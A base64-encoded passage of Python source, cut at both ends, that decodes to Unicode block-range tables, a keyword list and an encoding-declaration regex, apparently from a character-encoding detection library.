YWxpbmVzZSI6IHJhbmdlKDY5MTIsIDcwMzkgKyAxKSxcbiAgICAiU3VuZGFuZXNlIjogcmFuZ2UoNzA0MCwgNzEwMyArIDEpLFxuICAgICJCYXRhayI6IHJhbmdlKDcxMDQsIDcxNjcgKyAxKSxcbiAgICAiTGVwY2hhIjogcmFuZ2UoNzE2OCwgNzI0NyArIDEpLFxuICAgICJPbCBDaGlraSI6IHJhbmdlKDcyNDgsIDcyOTUgKyAxKSxcbiAgICAiQ3lyaWxsaWMgRXh0ZW5kZWQgQyI6IHJhbmdlKDcyOTYsIDczMTEgKyAxKSxcbiAgICAiU3VuZGFuZXNlIFN1cHBsZW1lbnQiOiByYW5nZSg3MzYwLCA3Mzc1ICsgMSksXG4gICAgIlZlZGljIEV4dGVuc2lvbnMiOiByYW5nZSg3Mzc2LCA3NDIzICsgMSksXG4gICAgIlBob25ldGljIEV4dGVuc2lvbnMiOiByYW5nZSg3NDI0LCA3NTUxICsgMSksXG4gICAgIlBob25ldGljIEV4dGVuc2lvbnMgU3VwcGxlbWVudCI6IHJhbmdlKDc1NTIsIDc2MTUgKyAxKSxcbiAgICAiQ29tYmluaW5nIERpYWNyaXRpY2FsIE1hcmtzIFN1cHBsZW1lbnQiOiByYW5nZSg3NjE2LCA3Njc5ICsgMSksXG4gICAgIkxhdGluIEV4dGVuZGVkIEFkZGl0aW9uYWwiOiByYW5nZSg3NjgwLCA3OTM1ICsgMSksXG4gICAgIkdyZWVrIEV4dGVuZGVkIjogcmFuZ2UoNzkzNiwgODE5MSArIDEpLFxuICAgICJHZW5lcmFsIFB1bmN0dWF0aW9uIjogcmFuZ2UoODE5MiwgODMwMyArIDEpLFxuICAgICJTdXBlcnNjcmlwdHMgYW5kIFN1YnNjcmlwdHMiOiByYW5nZSg4MzA0LCA4MzUxICsgMSksXG4gICAgIkN1cnJlbmN5IFN5bWJvbHMiOiByYW5nZSg4MzUyLCA4Mzk5ICsgMSksXG4gICAgIkNvbWJpbmluZyBEaWFjcml0aWNhbCBNYXJrcyBmb3IgU3ltYm9scyI6IHJhbmdlKDg0MDAsIDg0NDcgKyAxKSxcbiAgICAiTGV0dGVybGlrZSBTeW1ib2xzIjogcmFuZ2UoODQ0OCwgODUyNyArIDEpLFxuICAgICJOdW1iZXIgRm9ybXMiOiByYW5nZSg4NTI4LCA4NTkxICsgMSksXG4gICAgIkFycm93cyI6IHJhbmdlKDg1OTIsIDg3MDMgKyAxKSxcbiAgICAiTWF0aGVtYXRpY2FsIE9wZXJhdG9ycyI6IHJhbmdlKDg3MDQsIDg5NTkgKyAxKSxcbiAgICAiTWlzY2VsbGFuZW91cyBUZWNobmljYWwiOiByYW5nZSg4OTYwLCA5MjE1ICsgMSksXG4gICAgIkNvbnRyb2wgUGljdHVyZXMiOiByYW5nZSg5MjE2LCA5Mjc5ICsgMSksXG4gICAgIk9wdGljYWwgQ2hhcmFjdGVyIFJlY29nbml0aW9uIjogcmFuZ2UoOTI4MCwgOTMxMSArIDEpLFxuICAgICJFbmNsb3NlZCBBbHBoYW51bWVyaWNzIjogcmFuZ2UoOTMxMiwgOTQ3MSArIDEpLFxuICAgICJCb3ggRHJhd2luZyI6IHJhbmdlKDk0NzIsIDk1OTkgKyAxKSxcbiAgICAiQmxvY2sgRWxlbWVudHMiOiByYW5nZSg5NjAwLCA5NjMxICsgMSksXG4gICAgIkdlb21ldHJpYyBTaGFwZXMiOiByYW5nZSg5NjMyLCA5NzI3ICsgMSksXG4gICAgIk1pc2NlbGxhbmVvdXMgU3ltYm9scyI6IHJhbmdlKDk3MjgsIDk5ODMgKyAxKSxcbiAgICAiRGluZ2JhdHMiOiByYW5nZSg5OTg0LCAxMDE3NSArIDEpLFxuICAgICJNaXNjZWxsYW5lb3VzIE1hdGhlbWF0aWNhbCBTeW1ib2xzLUEiOiByYW5nZSgxMDE3NiwgMTAyMjMgKyAxKSxcbiAgICAiU3VwcGxlbWVudGFsIEFycm93cy1BIjogcmFuZ2UoMTAyMjQsIDEwMjM5ICsgMSksXG4gICAgIkJyYWlsbGUgUGF0dGVybnMiOiByYW5nZSgxMDI0MCwgMTA0OTUgKyAxKSxcbiAgICAiU3VwcGxlbWVudGFsIEFycm93cy1CIjogcmFuZ2UoMTA0OTYsIDEwNjIzICsgMSksXG4gICAgIk1pc2NlbGxhbmVvdXMgTWF0aGVtYXRpY2FsIFN5bWJvbHMtQiI6IHJhbmdlKDEwNjI0LCAxMDc1MSArIDEpLFxuICAgICJTdXBwbGVtZW50YWwgTWF0aGVtYXRpY2FsIE9wZXJhdG9ycyI6IHJhbmdlKDEwNzUyLCAxMTAwNyArIDEpLFxuICAgICJNaXNjZWxsYW5lb3VzIFN5bWJvbHMgYW5kIEFycm93cyI6IHJhbmdlKDExMDA4LCAxMTI2MyArIDEpLFxuICAgICJHbGFnb2xpdGljIjogcmFuZ2UoMTEyNjQsIDExMzU5ICsgMSksXG4gICAgIkxhdGluIEV4dGVuZGVkLUMiOiByYW5nZSgxMTM2MCwgMTEzOTEgKyAxKSxcbiAgICAiQ29wdGljIjogcmFuZ2UoMTEzOTIsIDExNTE5ICsgMSksXG4gICAgIkdlb3JnaWFuIFN1cHBsZW1lbnQiOiByYW5nZSgxMTUyMCwgMTE1NjcgKyAxKSxcbiAgICAiVGlmaW5hZ2giOiByYW5nZSgxMTU2OCwgMTE2NDcgKyAxKSxcbiAgICAiRXRoaW9waWMgRXh0ZW5kZWQiOiByYW5nZSgxMTY0OCwgMTE3NDMgKyAxKSxcbiAgICAiQ3lyaWxsaWMgRXh0ZW5kZWQtQSI6IHJhbmdlKDExNzQ0LCAxMTc3NSArIDEpLFxuICAgICJTdXBwbGVtZW50YWwgUHVuY3R1YXRpb24iOiByYW5nZSgxMTc3NiwgMTE5MDMgKyAxKSxcbiAgICAiQ0pLIFJhZGljYWxzIFN1cHBsZW1lbnQiOiByYW5nZSgxMTkwNCwgMTIwMzEgKyAxKSxcbiAgICAiS2FuZ3hpIFJhZGljYWxzIjogcmFuZ2UoMTIwMzIsIDEyMjU1ICsgMSksXG4gICAgIklkZW9ncmFwaGljIERlc2NyaXB0aW9uIENoYXJhY3RlcnMiOiByYW5nZSgxMjI3MiwgMTIyODcgKyAxKSxcbiAgICAiQ0pLIFN5bWJvbHMgYW5kIFB1bmN0dWF0aW9uIjogcmFuZ2UoMTIyODgsIDEyMzUxICsgMSksXG4gICAgIkhpcmFnYW5hIjogcmFuZ2UoMTIzNTIsIDEyNDQ3ICsgMSksXG4gICAgIkthdGFrYW5hIjogcmFuZ2UoMTI0NDgsIDEyNTQzICsgMSksXG4gICAgIkJvcG9tb2ZvIjogcmFuZ2UoMTI1NDQsIDEyNTkxICsgMSksXG4gICAgIkhhbmd1bCBDb21wYXRpYmlsaXR5IEphbW8iOiByYW5nZSgxMjU5MiwgMTI2ODcgKyAxKSxcbiAgICAiS2FuYnVuIjogcmFuZ2UoMTI2ODgsIDEyNzAzICsgMSksXG4gICAgIkJvcG9tb2ZvIEV4dGVuZGVkIjogcmFuZ2UoMTI3MDQsIDEyNzM1ICsgMSksXG4gICAgIkNKSyBTdHJva2VzIjogcmFuZ2UoMTI3MzYsIDEyNzgzICsgMSksXG4gICAgIkthdGFrYW5hIFBob25ldGljIEV4dGVuc2lvbnMiOiByYW5nZSgxMjc4NCwgMTI3OTkgKyAxKSxcbiAgICAiRW5jbG9zZWQgQ0pLIExldHRlcnMgYW5kIE1vbnRocyI6IHJhbmdlKDEyODAwLCAxMzA1NSArIDEpLFxuICAgICJDSksgQ29tcGF0aWJpbGl0eSI6IHJhbmdlKDEzMDU2LCAxMzMxMSArIDEpLFxuICAgICJDSksgVW5pZmllZCBJZGVvZ3JhcGhzIEV4dGVuc2lvbiBBIjogcmFuZ2UoMTMzMTIsIDE5OTAzICsgMSksXG4gICAgIllpamluZyBIZXhhZ3JhbSBTeW1ib2xzIjogcmFuZ2UoMTk5MDQsIDE5OTY3ICsgMSksXG4gICAgIkNKSyBVbmlmaWVkIElkZW9ncmFwaHMiOiByYW5nZSgxOTk2OCwgNDA5NTkgKyAxKSxcbiAgICAiWWkgU3lsbGFibGVzIjogcmFuZ2UoNDA5NjAsIDQyMTI3ICsgMSksXG4gICAgIllpIFJhZGljYWxzIjogcmFuZ2UoNDIxMjgsIDQyMTkxICsgMSksXG4gICAgIkxpc3UiOiByYW5nZSg0MjE5MiwgNDIyMzkgKyAxKSxcbiAgICAiVmFpIjogcmFuZ2UoNDIyNDAsIDQyNTU5ICsgMSksXG4gICAgIkN5cmlsbGljIEV4dGVuZGVkLUIiOiByYW5nZSg0MjU2MCwgNDI2NTUgKyAxKSxcbiAgICAiQmFtdW0iOiByYW5nZSg0MjY1NiwgNDI3NTEgKyAxKSxcbiAgICAiTW9kaWZpZXIgVG9uZSBMZXR0ZXJzIjogcmFuZ2UoNDI3NTIsIDQyNzgzICsgMSksXG4gICAgIkxhdGluIEV4dGVuZGVkLUQiOiByYW5nZSg0Mjc4NCwgNDMwMDcgKyAxKSxcbiAgICAiU3lsb3RpIE5hZ3JpIjogcmFuZ2UoNDMwMDgsIDQzMDU1ICsgMSksXG4gICAgIkNvbW1vbiBJbmRpYyBOdW1iZXIgRm9ybXMiOiByYW5nZSg0MzA1NiwgNDMwNzEgKyAxKSxcbiAgICAiUGhhZ3MtcGEiOiByYW5nZSg0MzA3MiwgNDMxMzUgKyAxKSxcbiAgICAiU2F1cmFzaHRyYSI6IHJhbmdlKDQzMTM2LCA0MzIzMSArIDEpLFxuICAgICJEZXZhbmFnYXJpIEV4dGVuZGVkIjogcmFuZ2UoNDMyMzIsIDQzMjYzICsgMSksXG4gICAgIktheWFoIExpIjogcmFuZ2UoNDMyNjQsIDQzMzExICsgMSksXG4gICAgIlJlamFuZyI6IHJhbmdlKDQzMzEyLCA0MzM1OSArIDEpLFxuICAgICJIYW5ndWwgSmFtbyBFeHRlbmRlZC1BIjogcmFuZ2UoNDMzNjAsIDQzMzkxICsgMSksXG4gICAgIkphdmFuZXNlIjogcmFuZ2UoNDMzOTIsIDQzNDg3ICsgMSksXG4gICAgIk15YW5tYXIgRXh0ZW5kZWQtQiI6IHJhbmdlKDQzNDg4LCA0MzUxOSArIDEpLFxuICAgICJDaGFtIjogcmFuZ2UoNDM1MjAsIDQzNjE1ICsgMSksXG4gICAgIk15YW5tYXIgRXh0ZW5kZWQtQSI6IHJhbmdlKDQzNjE2LCA0MzY0NyArIDEpLFxuICAgICJUYWkgVmlldCI6IHJhbmdlKDQzNjQ4LCA0Mzc0MyArIDEpLFxuICAgICJNZWV0ZWkgTWF5ZWsgRXh0ZW5zaW9ucyI6IHJhbmdlKDQzNzQ0LCA0Mzc3NSArIDEpLFxuICAgICJFdGhpb3BpYyBFeHRlbmRlZC1BIjogcmFuZ2UoNDM3NzYsIDQzODIzICsgMSksXG4gICAgIkxhdGluIEV4dGVuZGVkLUUiOiByYW5nZSg0MzgyNCwgNDM4ODcgKyAxKSxcbiAgICAiQ2hlcm9rZWUgU3VwcGxlbWVudCI6IHJhbmdlKDQzODg4LCA0Mzk2NyArIDEpLFxuICAgICJNZWV0ZWkgTWF5ZWsiOiByYW5nZSg0Mzk2OCwgNDQwMzEgKyAxKSxcbiAgICAiSGFuZ3VsIFN5bGxhYmxlcyI6IHJhbmdlKDQ0MDMyLCA1NTIxNSArIDEpLFxuICAgICJIYW5ndWwgSmFtbyBFeHRlbmRlZC1CIjogcmFuZ2UoNTUyMTYsIDU1Mjk1ICsgMSksXG4gICAgIkhpZ2ggU3Vycm9nYXRlcyI6IHJhbmdlKDU1Mjk2LCA1NjE5MSArIDEpLFxuICAgICJIaWdoIFByaXZhdGUgVXNlIFN1cnJvZ2F0ZXMiOiByYW5nZSg1NjE5MiwgNTYzMTkgKyAxKSxcbiAgICAiTG93IFN1cnJvZ2F0ZXMiOiByYW5nZSg1NjMyMCwgNTczNDMgKyAxKSxcbiAgICAiUHJpdmF0ZSBVc2UgQXJlYSI6IHJhbmdlKDU3MzQ0LCA2Mzc0MyArIDEpLFxuICAgICJDSksgQ29tcGF0aWJpbGl0eSBJZGVvZ3JhcGhzIjogcmFuZ2UoNjM3NDQsIDY0MjU1ICsgMSksXG4gICAgIkFscGhhYmV0aWMgUHJlc2VudGF0aW9uIEZvcm1zIjogcmFuZ2UoNjQyNTYsIDY0MzM1ICsgMSksXG4gICAgIkFyYWJpYyBQcmVzZW50YXRpb24gRm9ybXMtQSI6IHJhbmdlKDY0MzM2LCA2NTAyMyArIDEpLFxuICAgICJWYXJpYXRpb24gU2VsZWN0b3JzIjogcmFuZ2UoNjUwMjQsIDY1MDM5ICsgMSksXG4gICAgIlZlcnRpY2FsIEZvcm1zIjogcmFuZ2UoNjUwNDAsIDY1MDU1ICsgMSksXG4gICAgIkNvbWJpbmluZyBIYWxmIE1hcmtzIjogcmFuZ2UoNjUwNTYsIDY1MDcxICsgMSksXG4gICAgIkNKSyBDb21wYXRpYmlsaXR5IEZvcm1zIjogcmFuZ2UoNjUwNzIsIDY1MTAzICsgMSksXG4gICAgIlNtYWxsIEZvcm0gVmFyaWFudHMiOiByYW5nZSg2NTEwNCwgNjUxMzUgKyAxKSxcbiAgICAiQXJhYmljIFByZXNlbnRhdGlvbiBGb3Jtcy1CIjogcmFuZ2UoNjUxMzYsIDY1Mjc5ICsgMSksXG4gICAgIkhhbGZ3aWR0aCBhbmQgRnVsbHdpZHRoIEZvcm1zIjogcmFuZ2UoNjUyODAsIDY1NTE5ICsgMSksXG4gICAgIlNwZWNpYWxzIjogcmFuZ2UoNjU1MjAsIDY1NTM1ICsgMSksXG4gICAgIkxpbmVhciBCIFN5bGxhYmFyeSI6IHJhbmdlKDY1NTM2LCA2NTY2MyArIDEpLFxuICAgICJMaW5lYXIgQiBJZGVvZ3JhbXMiOiByYW5nZSg2NTY2NCwgNjU3OTEgKyAxKSxcbiAgICAiQWVnZWFuIE51bWJlcnMiOiByYW5nZSg2NTc5MiwgNjU4NTUgKyAxKSxcbiAgICAiQW5jaWVudCBHcmVlayBOdW1iZXJzIjogcmFuZ2UoNjU4NTYsIDY1OTM1ICsgMSksXG4gICAgIkFuY2llbnQgU3ltYm9scyI6IHJhbmdlKDY1OTM2LCA2NTk5OSArIDEpLFxuICAgICJQaGFpc3RvcyBEaXNjIjogcmFuZ2UoNjYwMDAsIDY2MDQ3ICsgMSksXG4gICAgIkx5Y2lhbiI6IHJhbmdlKDY2MTc2LCA2NjIwNyArIDEpLFxuICAgICJDYXJpYW4iOiByYW5nZSg2NjIwOCwgNjYyNzEgKyAxKSxcbiAgICAiQ29wdGljIEVwYWN0IE51bWJlcnMiOiByYW5nZSg2NjI3MiwgNjYzMDMgKyAxKSxcbiAgICAiT2xkIEl0YWxpYyI6IHJhbmdlKDY2MzA0LCA2NjM1MSArIDEpLFxuICAgICJHb3RoaWMiOiByYW5nZSg2NjM1MiwgNjYzODMgKyAxKSxcbiAgICAiT2xkIFBlcm1pYyI6IHJhbmdlKDY2Mzg0LCA2NjQzMSArIDEpLFxuICAgICJVZ2FyaXRpYyI6IHJhbmdlKDY2NDMyLCA2NjQ2MyArIDEpLFxuICAgICJPbGQgUGVyc2lhbiI6IHJhbmdlKDY2NDY0LCA2NjUyNyArIDEpLFxuICAgICJEZXNlcmV0IjogcmFuZ2UoNjY1NjAsIDY2NjM5ICsgMSksXG4gICAgIlNoYXZpYW4iOiByYW5nZSg2NjY0MCwgNjY2ODcgKyAxKSxcbiAgICAiT3NtYW55YSI6IHJhbmdlKDY2Njg4LCA2NjczNSArIDEpLFxuICAgICJPc2FnZSI6IHJhbmdlKDY2NzM2LCA2NjgxNSArIDEpLFxuICAgICJFbGJhc2FuIjogcmFuZ2UoNjY4MTYsIDY2ODYzICsgMSksXG4gICAgIkNhdWNhc2lhbiBBbGJhbmlhbiI6IHJhbmdlKDY2ODY0LCA2NjkyNyArIDEpLFxuICAgICJMaW5lYXIgQSI6IHJhbmdlKDY3MDcyLCA2NzQ1NSArIDEpLFxuICAgICJDeXByaW90IFN5bGxhYmFyeSI6IHJhbmdlKDY3NTg0LCA2NzY0NyArIDEpLFxuICAgICJJbXBlcmlhbCBBcmFtYWljIjogcmFuZ2UoNjc2NDgsIDY3Njc5ICsgMSksXG4gICAgIlBhbG15cmVuZSI6IHJhbmdlKDY3NjgwLCA2NzcxMSArIDEpLFxuICAgICJOYWJhdGFlYW4iOiByYW5nZSg2NzcxMiwgNjc3NTkgKyAxKSxcbiAgICAiSGF0cmFuIjogcmFuZ2UoNjc4MDgsIDY3ODM5ICsgMSksXG4gICAgIlBob2VuaWNpYW4iOiByYW5nZSg2Nzg0MCwgNjc4NzEgKyAxKSxcbiAgICAiTHlkaWFuIjogcmFuZ2UoNjc4NzIsIDY3OTAzICsgMSksXG4gICAgIk1lcm9pdGljIEhpZXJvZ2x5cGhzIjogcmFuZ2UoNjc5NjgsIDY3OTk5ICsgMSksXG4gICAgIk1lcm9pdGljIEN1cnNpdmUiOiByYW5nZSg2ODAwMCwgNjgwOTUgKyAxKSxcbiAgICAiS2hhcm9zaHRoaSI6IHJhbmdlKDY4MDk2LCA2ODE5MSArIDEpLFxuICAgICJPbGQgU291dGggQXJhYmlhbiI6IHJhbmdlKDY4MTkyLCA2ODIyMyArIDEpLFxuICAgICJPbGQgTm9ydGggQXJhYmlhbiI6IHJhbmdlKDY4MjI0LCA2ODI1NSArIDEpLFxuICAgICJNYW5pY2hhZWFuIjogcmFuZ2UoNjgyODgsIDY4MzUxICsgMSksXG4gICAgIkF2ZXN0YW4iOiByYW5nZSg2ODM1MiwgNjg0MTUgKyAxKSxcbiAgICAiSW5zY3JpcHRpb25hbCBQYXJ0aGlhbiI6IHJhbmdlKDY4NDE2LCA2ODQ0NyArIDEpLFxuICAgICJJbnNjcmlwdGlvbmFsIFBhaGxhdmkiOiByYW5nZSg2ODQ0OCwgNjg0NzkgKyAxKSxcbiAgICAiUHNhbHRlciBQYWhsYXZpIjogcmFuZ2UoNjg0ODAsIDY4NTI3ICsgMSksXG4gICAgIk9sZCBUdXJraWMiOiByYW5nZSg2ODYwOCwgNjg2ODcgKyAxKSxcbiAgICAiT2xkIEh1bmdhcmlhbiI6IHJhbmdlKDY4NzM2LCA2ODg2MyArIDEpLFxuICAgICJSdW1pIE51bWVyYWwgU3ltYm9scyI6IHJhbmdlKDY5MjE2LCA2OTI0NyArIDEpLFxuICAgICJCcmFobWkiOiByYW5nZSg2OTYzMiwgNjk3NTkgKyAxKSxcbiAgICAiS2FpdGhpIjogcmFuZ2UoNjk3NjAsIDY5ODM5ICsgMSksXG4gICAgIlNvcmEgU29tcGVuZyI6IHJhbmdlKDY5ODQwLCA2OTg4NyArIDEpLFxuICAgICJDaGFrbWEiOiByYW5nZSg2OTg4OCwgNjk5NjcgKyAxKSxcbiAgICAiTWFoYWphbmkiOiByYW5nZSg2OTk2OCwgNzAwMTUgKyAxKSxcbiAgICAiU2hhcmFkYSI6IHJhbmdlKDcwMDE2LCA3MDExMSArIDEpLFxuICAgICJTaW5oYWxhIEFyY2hhaWMgTnVtYmVycyI6IHJhbmdlKDcwMTEyLCA3MDE0MyArIDEpLFxuICAgICJLaG9qa2kiOiByYW5nZSg3MDE0NCwgNzAyMjMgKyAxKSxcbiAgICAiTXVsdGFuaSI6IHJhbmdlKDcwMjcyLCA3MDMxOSArIDEpLFxuICAgICJLaHVkYXdhZGkiOiByYW5nZSg3MDMyMCwgNzAzOTkgKyAxKSxcbiAgICAiR3JhbnRoYSI6IHJhbmdlKDcwNDAwLCA3MDUyNyArIDEpLFxuICAgICJOZXdhIjogcmFuZ2UoNzA2NTYsIDcwNzgzICsgMSksXG4gICAgIlRpcmh1dGEiOiByYW5nZSg3MDc4NCwgNzA4NzkgKyAxKSxcbiAgICAiU2lkZGhhbSI6IHJhbmdlKDcxMDQwLCA3MTE2NyArIDEpLFxuICAgICJNb2RpIjogcmFuZ2UoNzExNjgsIDcxMjYzICsgMSksXG4gICAgIk1vbmdvbGlhbiBTdXBwbGVtZW50IjogcmFuZ2UoNzEyNjQsIDcxMjk1ICsgMSksXG4gICAgIlRha3JpIjogcmFuZ2UoNzEyOTYsIDcxMzc1ICsgMSksXG4gICAgIkFob20iOiByYW5nZSg3MTQyNCwgNzE0ODcgKyAxKSxcbiAgICAiV2FyYW5nIENpdGkiOiByYW5nZSg3MTg0MCwgNzE5MzUgKyAxKSxcbiAgICAiWmFuYWJhemFyIFNxdWFyZSI6IHJhbmdlKDcyMTkyLCA3MjI3MSArIDEpLFxuICAgICJTb3lvbWJvIjogcmFuZ2UoNzIyNzIsIDcyMzY3ICsgMSksXG4gICAgIlBhdSBDaW4gSGF1IjogcmFuZ2UoNzIzODQsIDcyNDQ3ICsgMSksXG4gICAgIkJoYWlrc3VraSI6IHJhbmdlKDcyNzA0LCA3MjgxNSArIDEpLFxuICAgICJNYXJjaGVuIjogcmFuZ2UoNzI4MTYsIDcyODk1ICsgMSksXG4gICAgIk1hc2FyYW0gR29uZGkiOiByYW5nZSg3Mjk2MCwgNzMwNTUgKyAxKSxcbiAgICAiQ3VuZWlmb3JtIjogcmFuZ2UoNzM3MjgsIDc0NzUxICsgMSksXG4gICAgIkN1bmVpZm9ybSBOdW1iZXJzIGFuZCBQdW5jdHVhdGlvbiI6IHJhbmdlKDc0NzUyLCA3NDg3OSArIDEpLFxuICAgICJFYXJseSBEeW5hc3RpYyBDdW5laWZvcm0iOiByYW5nZSg3NDg4MCwgNzUwODcgKyAxKSxcbiAgICAiRWd5cHRpYW4gSGllcm9nbHlwaHMiOiByYW5nZSg3NzgyNCwgNzg4OTUgKyAxKSxcbiAgICAiQW5hdG9saWFuIEhpZXJvZ2x5cGhzIjogcmFuZ2UoODI5NDQsIDgzNTgzICsgMSksXG4gICAgIkJhbXVtIFN1cHBsZW1lbnQiOiByYW5nZSg5MjE2MCwgOTI3MzUgKyAxKSxcbiAgICAiTXJvIjogcmFuZ2UoOTI3MzYsIDkyNzgzICsgMSksXG4gICAgIkJhc3NhIFZhaCI6IHJhbmdlKDkyODgwLCA5MjkyNyArIDEpLFxuICAgICJQYWhhd2ggSG1vbmciOiByYW5nZSg5MjkyOCwgOTMwNzEgKyAxKSxcbiAgICAiTWlhbyI6IHJhbmdlKDkzOTUyLCA5NDExMSArIDEpLFxuICAgICJJZGVvZ3JhcGhpYyBTeW1ib2xzIGFuZCBQdW5jdHVhdGlvbiI6IHJhbmdlKDk0MTc2LCA5NDIwNyArIDEpLFxuICAgICJUYW5ndXQiOiByYW5nZSg5NDIwOCwgMTAwMzUxICsgMSksXG4gICAgIlRhbmd1dCBDb21wb25lbnRzIjogcmFuZ2UoMTAwMzUyLCAxMDExMTkgKyAxKSxcbiAgICAiS2FuYSBTdXBwbGVtZW50IjogcmFuZ2UoMTEwNTkyLCAxMTA4NDcgKyAxKSxcbiAgICAiS2FuYSBFeHRlbmRlZC1BIjogcmFuZ2UoMTEwODQ4LCAxMTA4OTUgKyAxKSxcbiAgICAiTnVzaHUiOiByYW5nZSgxMTA5NjAsIDExMTM1OSArIDEpLFxuICAgICJEdXBsb3lhbiI6IHJhbmdlKDExMzY2NCwgMTEzODIzICsgMSksXG4gICAgIlNob3J0aGFuZCBGb3JtYXQgQ29udHJvbHMiOiByYW5nZSgxMTM4MjQsIDExMzgzOSArIDEpLFxuICAgICJCeXphbnRpbmUgTXVzaWNhbCBTeW1ib2xzIjogcmFuZ2UoMTE4Nzg0LCAxMTkwMzkgKyAxKSxcbiAgICAiTXVzaWNhbCBTeW1ib2xzIjogcmFuZ2UoMTE5MDQwLCAxMTkyOTUgKyAxKSxcbiAgICAiQW5jaWVudCBHcmVlayBNdXNpY2FsIE5vdGF0aW9uIjogcmFuZ2UoMTE5Mjk2LCAxMTkzNzUgKyAxKSxcbiAgICAiVGFpIFh1YW4gSmluZyBTeW1ib2xzIjogcmFuZ2UoMTE5NTUyLCAxMTk2NDcgKyAxKSxcbiAgICAiQ291bnRpbmcgUm9kIE51bWVyYWxzIjogcmFuZ2UoMTE5NjQ4LCAxMTk2NzkgKyAxKSxcbiAgICAiTWF0aGVtYXRpY2FsIEFscGhhbnVtZXJpYyBTeW1ib2xzIjogcmFuZ2UoMTE5ODA4LCAxMjA4MzEgKyAxKSxcbiAgICAiU3V0dG9uIFNpZ25Xcml0aW5nIjogcmFuZ2UoMTIwODMyLCAxMjE1MTkgKyAxKSxcbiAgICAiR2xhZ29saXRpYyBTdXBwbGVtZW50IjogcmFuZ2UoMTIyODgwLCAxMjI5MjcgKyAxKSxcbiAgICAiTWVuZGUgS2lrYWt1aSI6IHJhbmdlKDEyNDkyOCwgMTI1MTUxICsgMSksXG4gICAgIkFkbGFtIjogcmFuZ2UoMTI1MTg0LCAxMjUyNzkgKyAxKSxcbiAgICAiQXJhYmljIE1hdGhlbWF0aWNhbCBBbHBoYWJldGljIFN5bWJvbHMiOiByYW5nZSgxMjY0NjQsIDEyNjcxOSArIDEpLFxuICAgICJNYWhqb25nIFRpbGVzIjogcmFuZ2UoMTI2OTc2LCAxMjcwMjMgKyAxKSxcbiAgICAiRG9taW5vIFRpbGVzIjogcmFuZ2UoMTI3MDI0LCAxMjcxMzUgKyAxKSxcbiAgICAiUGxheWluZyBDYXJkcyI6IHJhbmdlKDEyNzEzNiwgMTI3MjMxICsgMSksXG4gICAgIkVuY2xvc2VkIEFscGhhbnVtZXJpYyBTdXBwbGVtZW50IjogcmFuZ2UoMTI3MjMyLCAxMjc0ODcgKyAxKSxcbiAgICAiRW5jbG9zZWQgSWRlb2dyYXBoaWMgU3VwcGxlbWVudCI6IHJhbmdlKDEyNzQ4OCwgMTI3NzQzICsgMSksXG4gICAgIk1pc2NlbGxhbmVvdXMgU3ltYm9scyBhbmQgUGljdG9ncmFwaHMiOiByYW5nZSgxMjc3NDQsIDEyODUxMSArIDEpLFxuICAgICJFbW90aWNvbnMgcmFuZ2UoRW1vamkpIjogcmFuZ2UoMTI4NTEyLCAxMjg1OTEgKyAxKSxcbiAgICAiT3JuYW1lbnRhbCBEaW5nYmF0cyI6IHJhbmdlKDEyODU5MiwgMTI4NjM5ICsgMSksXG4gICAgIlRyYW5zcG9ydCBhbmQgTWFwIFN5bWJvbHMiOiByYW5nZSgxMjg2NDAsIDEyODc2NyArIDEpLFxuICAgICJBbGNoZW1pY2FsIFN5bWJvbHMiOiByYW5nZSgxMjg3NjgsIDEyODg5NSArIDEpLFxuICAgICJHZW9tZXRyaWMgU2hhcGVzIEV4dGVuZGVkIjogcmFuZ2UoMTI4ODk2LCAxMjkwMjMgKyAxKSxcbiAgICAiU3VwcGxlbWVudGFsIEFycm93cy1DIjogcmFuZ2UoMTI5MDI0LCAxMjkyNzkgKyAxKSxcbiAgICAiU3VwcGxlbWVudGFsIFN5bWJvbHMgYW5kIFBpY3RvZ3JhcGhzIjogcmFuZ2UoMTI5MjgwLCAxMjk1MzUgKyAxKSxcbiAgICAiQ0pLIFVuaWZpZWQgSWRlb2dyYXBocyBFeHRlbnNpb24gQiI6IHJhbmdlKDEzMTA3MiwgMTczNzkxICsgMSksXG4gICAgIkNKSyBVbmlmaWVkIElkZW9ncmFwaHMgRXh0ZW5zaW9uIEMiOiByYW5nZSgxNzM4MjQsIDE3Nzk4MyArIDEpLFxuICAgICJDSksgVW5pZmllZCBJZGVvZ3JhcGhzIEV4dGVuc2lvbiBEIjogcmFuZ2UoMTc3OTg0LCAxNzgyMDcgKyAxKSxcbiAgICAiQ0pLIFVuaWZpZWQgSWRlb2dyYXBocyBFeHRlbnNpb24gRSI6IHJhbmdlKDE3ODIwOCwgMTgzOTgzICsgMSksXG4gICAgIkNKSyBVbmlmaWVkIElkZW9ncmFwaHMgRXh0ZW5zaW9uIEYiOiByYW5nZSgxODM5ODQsIDE5MTQ3MSArIDEpLFxuICAgICJDSksgQ29tcGF0aWJpbGl0eSBJZGVvZ3JhcGhzIFN1cHBsZW1lbnQiOiByYW5nZSgxOTQ1NjAsIDE5NTEwMyArIDEpLFxuICAgICJUYWdzIjogcmFuZ2UoOTE3NTA0LCA5MTc2MzEgKyAxKSxcbiAgICAiVmFyaWF0aW9uIFNlbGVjdG9ycyBTdXBwbGVtZW50IjogcmFuZ2UoOTE3NzYwLCA5MTc5OTkgKyAxKSxcbn0gICMgdHlwZTogRGljdFtzdHIsIHJhbmdlXVxuXG5cblVOSUNPREVfU0VDT05EQVJZX1JBTkdFX0tFWVdPUkQgPSBbXG4gICAgIlN1cHBsZW1lbnQiLFxuICAgICJFeHRlbmRlZCIsXG4gICAgIkV4dGVuc2lvbnMiLFxuICAgICJNb2RpZmllciIsXG4gICAgIk1hcmtzIixcbiAgICAiUHVuY3R1YXRpb24iLFxuICAgICJTeW1ib2xzIixcbiAgICAiRm9ybXMiLFxuICAgICJPcGVyYXRvcnMiLFxuICAgICJNaXNjZWxsYW5lb3VzIixcbiAgICAiRHJhd2luZyIsXG4gICAgIkJsb2NrIixcbiAgICAiU2hhcGVzIixcbiAgICAiU3VwcGxlbWVudGFsIixcbiAgICAiVGFncyIsXG5dICAjIHR5cGU6IExpc3Rbc3RyXVxuXG5SRV9QT1NTSUJMRV9FTkNPRElOR19JTkRJQ0FUSU9OID0gcmVfY29tcGlsZShcbiAgICByIig/Oig/OmVuY29kaW5nKXwoPzpjaGFyc2V0KXwoPzpjb2RpbmcpKSg/OltcXDo9IF17MSwxMH0pKD86W1xcIlxcXCddPykoW2EtekEtWjAtOVxcLV9dKykoPzpbXFwiXFxcJ10/KSIsXG4gICAgSUdOT1JFQ0FTRSxcbilcblxuSUFOQV9TVVBQT1JURUQgPSBzb3J0ZWQoXG4gICAgZmlsdGVyKFxuICAgICAgICBsYW1iZGEgeDogeC5lb